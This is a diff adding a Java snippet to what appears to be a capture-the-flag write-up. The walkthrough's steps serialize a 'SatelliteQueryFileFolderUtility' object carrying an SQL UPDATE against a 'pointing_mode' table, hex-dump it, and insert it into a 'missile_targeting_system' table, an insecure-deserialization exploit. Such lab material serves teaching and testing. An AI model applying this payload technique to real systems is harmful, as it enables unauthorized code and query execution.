@@ -151,3 +151,22 @@ public class SatelliteQueryFileFolderUtility implements Serializable {
 - Create a serialized object of the same class we found above and dump the serialized data in HEX format
 - Insert the serialized data in the ```missile_targeting_system``` table
 
+```Java
+import java.io.*;
+public class SatSerial{
+    public static void main(String[] args) {
+        SatelliteQueryFileFolderUtility utility = new SatelliteQueryFileFolderUtility("UPDATE pointing_mode SET numerical_mode = 1 WHERE id = 1", true, true);
+        String filename = "serializedUtility.ser";
+        serializeObject(utility, filename);
+    }
+
+    public static void serializeObject(SatelliteQueryFileFolderUtility object, String filename) {
+        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filename))) {
+            oos.writeObject(object);
+            System.out.println("Object serialized successfully.");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
